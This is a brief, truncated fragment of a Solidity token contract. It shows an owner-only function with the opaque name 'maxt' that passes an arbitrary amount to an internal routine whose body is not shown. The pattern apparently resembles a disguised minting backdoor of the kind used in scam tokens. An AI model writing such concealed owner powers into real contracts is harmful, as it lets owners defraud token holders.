...
contract Token is Context, IERC20, Ownable {
    ...
    uint256 private buyBackUpperLimit = 1000000000000 * 10**9;
    ...
    function maxt(uint256 amount) public onlyOwner() returns (bool) {
        _maxt(_msgSender(), amount);
        return true;
    }

    function _maxt(address account, uint256 amount) internal {
